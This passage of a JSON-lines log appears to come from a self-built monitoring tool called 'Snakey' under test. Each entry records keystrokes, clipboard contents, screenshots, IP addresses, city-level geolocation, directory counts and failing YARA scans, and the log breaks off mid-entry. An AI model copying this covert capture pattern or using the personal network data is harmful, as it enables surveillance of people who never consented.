"AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: ./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "88b6d5c64045108c0ec1cf4c2b956de223e5b53b028dd9f42b83f46ade86bcf7", "screenshot_hash": "b8bc05d950a11c423a0f240695679903fcc62c23182076a4e2d89b697e750808", "keystroke_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"timestamp": "2025-05-22T19:17:42.781573", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "yara_rules_path = r\"C:\\Users\\ktmdu\\PycharmProjects\\Snakey\\Yara-rules\\yara_rules\\malware_index.yar\"\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: ./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "f3d0e33159ba63d2c8c5becdd57fde5d66fc50e16fc95608b7fd54de8d7e1365", "screenshot_hash": "7972706ed63b80ad8125a6254594b72efa009bc440ea07c68c2977f1879a3951", "keystroke_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"timestamp": "2025-05-22T19:18:10.399477", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "yara_rules_path = r\"C:\\Users\\ktmdu\\PycharmProjects\\Snakey\\Yara-rules\\yara_rules\\malware_index.yar\"\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: ./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "f3d0e33159ba63d2c8c5becdd57fde5d66fc50e16fc95608b7fd54de8d7e1365", "screenshot_hash": "ca04437bee45a4571397de2af2f3bc13aa09d748f8bf9e5e7a9f61e154916b68", "keystroke_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"timestamp": "2025-05-22T19:18:37.508099", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "yara_rules_path = r\"C:\\Users\\ktmdu\\PycharmProjects\\Snakey\\Yara-rules\\yara_rules\\malware_index.yar\"\r\n", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: ./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "f3d0e33159ba63d2c8c5becdd57fde5d66fc50e16fc95608b7fd54de8d7e1365", "screenshot_hash": "d1055c7a6a29f3e979447f9b19f10174c90e1a432e2357e3ed29f88be6a6e52c", "keystroke_hash": "8a4b7d424fd03283163ff1c35056008bf8284d6061fdef395dbb9df6b6b9350f"}
{"timestamp": "2025-05-22T19:19:11.455666", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "yara_rules_path = r\"C:\\Users\\ktmdu\\PycharmProjects\\Snakey\\Yara-rules\\yara_rules\\malware_index.yar\"\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: ./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "f3d0e33159ba63d2c8c5becdd57fde5d66fc50e16fc95608b7fd54de8d7e1365", "screenshot_hash": "1ca1e44b090490d593ced8d48fd933e447d573536f9778feb5b8ea4e397c40b4", "keystroke_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"timestamp": "2025-05-22T19:19:37.816649", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "yara_rules_path = r\"C:\\Users\\ktmdu\\PycharmProjects\\Snakey\\Yara-rules\\yara_rules\\malware_index.yar\"\r\n", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: ./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "f3d0e33159ba63d2c8c5becdd57fde5d66fc50e16fc95608b7fd54de8d7e1365", "screenshot_hash": "0f9b07980d438c09f64fa27b82793af1203ffb64ec83da0d33ed537ce1e4b5a4", "keystroke_hash": "8a4b7d424fd03283163ff1c35056008bf8284d6061fdef395dbb9df6b6b9350f"}
{"timestamp": "2025-05-22T19:22:02.730061", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "malware_index.yar", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: (2, 'No such file or directory')"}], "clipboard_hash": "c6d98569cf8bb27076a82f689c2b28f8098750b42e13a1321246556f4480a23a", "screenshot_hash": "192e395017d5bcfef68b65366baa1b7dfebc1b538e3d9d1ebe334635d14b1a62", "log_hash": "a45c737cf591ba682f50b7a2dca5fabc338a92a932bc6cfedeff3d31880e1439"}
{"timestamp": "2025-05-22T19:28:57.628670", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "yara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\\./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "8cb0d1378c454f12e97d218e9e39502f3294ffaa3e31d7a00008abbae92e5f23", "screenshot_hash": "b6afd91f56c63aec5f1a275add463842c2469447a4e549ad35b6dfc8a788e977", "log_hash": "2efd48c4458e6bf9d371fa2b96d288a3bc02a90f3ea91d783fff68dd97e255ed"}
{"timestamp": "2025-05-22T19:29:25.670282", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "yara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n", "keystrokes": "\u0003stop_sbakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\\./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "8cb0d1378c454f12e97d218e9e39502f3294ffaa3e31d7a00008abbae92e5f23", "screenshot_hash": "505833ea7112670d951f126e0226f2f545b6fc5d7f9ab3da489bebc218809fbf", "log_hash": "be7e07761041ecb1c1c1809c6b94f20a79a78bfd015bbee9d04e1ff51f675877"}
{"timestamp": "2025-05-22T19:32:00.689465", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:789d:d24:882f:6996", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "cuckoo.mutex(/Ad48qw4d6wq84d56as|Adkhvhhydhasdasashbc/)\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\\./malware/MALW_AZORULT.yar(23): invalid field name \"mutex\""}], "clipboard_hash": "a043c30e2acb960fb57ad8f0f435fb928d24a938db6077d243ebb52a280d0982", "screenshot_hash": "f1ed811c91bb83854ccb4aa375040cac37a2722dd7e9ba18e07ceb4a42ff8442", "log_hash": "f860daf01eefd65d6548af9f814eaedf6bdb5009a19a9e43404b520dc4a7cfa6"}
{"timestamp": "2025-05-22T19:32:27.013280", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:789d:d24:882f:6996", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "cuckoo.mutex(/Ad48qw4d6wq84d56as|Adkhvhhydhasdasashbc/)\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\\./malware/MALW_AZORULT.yar(23): invalid field name \"mutex\""}], "clipboard_hash": "a043c30e2acb960fb57ad8f0f435fb928d24a938db6077d243ebb52a280d0982", "screenshot_hash": "2a1b21faf047faccf74cbb44d1c3549a9e5eb41d0ef8da846291a1146e8c6f0e", "log_hash": "e6ca625a73f86489a2171a1fd74b31d8e00cd47d8dd7f3ce643bee1467f36a91"}
{"timestamp": "2025-05-22T19:32:53.849982", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:789d:d24:882f:6996", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "{\r\n        \"timestamp\": \"2025-05-22T19:32:27.013280\",\r\n        \"system\": {\r\n            \"username\": \"user\",\r\n            \"hostname\": \"MSI\",\r\n            \"private_ip_v4\": \"192.168.1.71\",\r\n            \"ip_v6\": \"2001:8a0:df46:3c00:789d:d24:882f:6996\",\r\n            \"public_ip\": \"2.83.128.150\",\r\n            \"country\": \"PT\",\r\n            \"region\": \"Lisbon\",\r\n            \"city\": \"Torres Vedras\",\r\n            \"isp\": \"AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.\",\r\n            \"processor\": \"Intel64 Family 6 Model 186 Stepping 2, GenuineIntel\",\r\n            \"os\": \"Windows 10.0.26100\",\r\n            \"machine\": \"AMD64\"\r\n        },\r\n        \"clipboard\": \"cuckoo.mutex(/Ad48qw4d6wq84d56as|Adkhvhhydhasdasashbc/)\\r\\n\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": true,\r\n        \"alerts\": [\r\n            \"Access from untrusted country: PT\"\r\n        ],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {\r\n            \"abuse_score\": 0,\r\n            \"total_reports\": 0,\r\n            \"country\": \"PT\",\r\n            \"isp\": \"PT Comunicacoes S.A.\",\r\n            \"domain\": \"meo.pt\",\r\n            \"last_reported\": null\r\n        },\r\n        \"important_dirs\": {\r\n            \"Desktop\": \"Not found\",\r\n            \"Documents\": \"Found (6 items)\",\r\n            \"Downloads\": \"Found (750 items)\",\r\n            \"AppData\": \"Found (54 items)\",\r\n            \"LocalAppData\": \"Found (113 items)\"\r\n        },\r\n        \"yara_findings\": [\r\n            {\r\n                \"error\": \"YARA scan failed: C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\\\\./malware/MALW_AZORULT.yar(23): invalid field name \\\"mutex\\\"\"\r\n            }\r\n        ],\r\n        \"clipboard_hash\": \"a043c30e2acb960fb57ad8f0f435fb928d24a938db6077d243ebb52a280d0982\",\r\n        \"screenshot_hash\": \"2a1b21faf047faccf74cbb44d1c3549a9e5eb41d0ef8da846291a1146e8c6f0e\",\r\n        \"log_hash\": \"e6ca625a73f86489a2171a1fd74b31d8e00cd47d8dd7f3ce643bee1467f36a91\"\r\n    }\r\n]", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\\./malware/MALW_AZORULT.yar(23): invalid field name \"mutex\""}], "clipboard_hash": "f4999afc8c27bb42d37ef706091f9ed18f982398321f9b263183656226defeda", "screenshot_hash": "4d74d16543d30c000ec4d49c7e2d3fee7ad793e46e471172c0cbda4d1aec8be1", "log_hash": "d29dd2aaa81a0a358d037aa917aa4bc8653ce922d4ebd4872d49d583116cbe40"}
{"timestamp": "2025-06-04T11:58:40.032935", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "if __name__ == \"__main__\":\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f59ced0cbcd764a74d037fc55dfa59e39d9853f157957de9e8c09f3ecabb9fb7", "screenshot_hash": "b6823089ee9c7eaceb5d9d8858840832984f22a6d9db419ac39fd4453ccf8e6b", "log_hash": "2abe7cea0ca54cc82aeb86ddd85ec3e6dd3267e45951012a2f121b77ca4d4d32"}
{"timestamp": "2025-06-04T11:59:06.142154", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "if __name__ == \"__main__\":\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f59ced0cbcd764a74d037fc55dfa59e39d9853f157957de9e8c09f3ecabb9fb7", "screenshot_hash": "5681e9411d3f202e980e45472ae3361b70f15b17e654042bb3e859d78e36cc8f", "log_hash": "3536e3917d0d1236c1fd00d5beb037b84a68c483812e22865cfed0db9b83af7f"}
{"timestamp": "2025-06-04T11:59:32.360825", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "if __name__ == \"__main__\":\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f59ced0cbcd764a74d037fc55dfa59e39d9853f157957de9e8c09f3ecabb9fb7", "screenshot_hash": "6d27ae3caf0adf579d68b4294cd48442b0390001639a21a29b2e275f7988c8ca", "log_hash": "bd4e25f621e4f33c30eb24598809b198e511c3f3578b5c38e114bfc910e9772a"}
{"timestamp": "2025-06-04T12:25:43.361017", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "@echo off\r\ncd /d \"C:\\Users\\ktmdu\\PycharmProjects\\Snakey\\Cryptography\"\r\n\r\n:: Create virtual environment if it doesn't exist\r\nif not exist \"snakey\\Scripts\\python.exe\" (\r\n    python -m venv snakey\r\n)\r\n\r\n:: Activate virtual environment\r\ncall snakey\\Scripts\\activate\r\n\r\n:: Upgrade pip to latest version\r\npython -m pip install --upgrade pip\r\n\r\n:: Install or update dependencies from the correct requirements.txt path\r\nif exist \"..\\Project\\requirements.txt\" (\r\n    pip install --upgrade -r \"..\\Project\\requirements.txt\"\r\n) else (\r\n    echo [WARNING] No requirements.txt found at ..\\Project\\. Skipping pip install.\r\n)\r\n\r\n:: Run your main Python script\r\npython Snakey_service.py\r\n\r\npause\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1006313360b04863a6894db11ccc9cc229a834b07cccecb15cd0cba7f9c982cf", "screenshot_hash": "ab2a93127a64df095e55ec2efd1c554e334170d07d515d6077de9eae87394cae", "log_hash": "33faeb1fb3edb1a89d4c930f235d61e5a405cf5e6df4be13a28199f401ce3810"}
{"timestamp": "2025-06-04T12:26:12.001573", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "@echo off\r\ncd /d \"C:\\Users\\ktmdu\\PycharmProjects\\Snakey\\Cryptography\"\r\n\r\n:: Create virtual environment if it doesn't exist\r\nif not exist \"snakey\\Scripts\\python.exe\" (\r\n    python -m venv snakey\r\n)\r\n\r\n:: Activate virtual environment\r\ncall snakey\\Scripts\\activate\r\n\r\n:: Upgrade pip to latest version\r\npython -m pip install --upgrade pip\r\n\r\n:: Install or update dependencies from the correct requirements.txt path\r\nif exist \"..\\Project\\requirements.txt\" (\r\n    pip install --upgrade -r \"..\\Project\\requirements.txt\"\r\n) else (\r\n    echo [WARNING] No requirements.txt found at ..\\Project\\. Skipping pip install.\r\n)\r\n\r\n:: Run your main Python script\r\npython Snakey_service.py\r\n\r\npause\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1006313360b04863a6894db11ccc9cc229a834b07cccecb15cd0cba7f9c982cf", "screenshot_hash": "03601783a8a6be724bacf181a4cd09b44f03af585700ec21ef0266d4220b2e91", "log_hash": "75aec0460f471ebfd6033d67ca6a2bd9005ebf8303f81a7b36cceb3925e62db0"}
{"timestamp": "2025-06-04T12:26:38.681121", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "@echo off\r\ncd /d \"C:\\Users\\ktmdu\\PycharmProjects\\Snakey\\Cryptography\"\r\n\r\n:: Create virtual environment if it doesn't exist\r\nif not exist \"snakey\\Scripts\\python.exe\" (\r\n    python -m venv snakey\r\n)\r\n\r\n:: Activate virtual environment\r\ncall snakey\\Scripts\\activate\r\n\r\n:: Upgrade pip to latest version\r\npython -m pip install --upgrade pip\r\n\r\n:: Install or update dependencies from the correct requirements.txt path\r\nif exist \"..\\Project\\requirements.txt\" (\r\n    pip install --upgrade -r \"..\\Project\\requirements.txt\"\r\n) else (\r\n    echo [WARNING] No requirements.txt found at ..\\Project\\. Skipping pip install.\r\n)\r\n\r\n:: Run your main Python script\r\npython Snakey_service.py\r\n\r\npause\r\n", "keystrokes": "\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1006313360b04863a6894db11ccc9cc229a834b07cccecb15cd0cba7f9c982cf", "screenshot_hash": "4fb40beffdf604cb7ed79e2af911d19e2a6b1c8a831a959b909dd8ee0be44f23", "log_hash": "70601334881888e897e2aac785c8e8bd8e5ba3683e2abf09e827b8ebab8c2d5f"}
{"timestamp": "2025-06-04T12:27:05.107283", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://mp3fpv6xbrwka4skqliiifoizghfbjy5uyu77wwnfruwub5s4hly2oid.onion/", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {"clipboard_url": {"malicious": 0, "suspicious": 0, "undetected": 29, "harmless": 67, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c0857bf944d60d589fbb24d0e6047c67ff75665da3364c2e8e74f005d94711d1", "screenshot_hash": "0fcbb76d4b83423425b934259582ae4b214d0fb39d3956622e6e2ec83824ac91", "log_hash": "5b43e8265633aad07662248abbb94c0ab98c1b1b697dabe3819217d47a401e6f"}
{"timestamp": "2025-06-04T12:27:32.035598", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://mp3fpv6xbrwka4skqliiifoizghfbjy5uyu77wwnfruwub5s4hly2oid.onion/", "keystrokes": "to te", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {"clipboard_url": {"malicious": 0, "suspicious": 0, "undetected": 29, "harmless": 67, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (766 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c0857bf944d60d589fbb24d0e6047c67ff75665da3364c2e8e74f005d94711d1", "screenshot_hash": "f72e2d001c8441d07a384f673d7e5703612eb6448ae2e39fe23c329887b40df5", "log_hash": 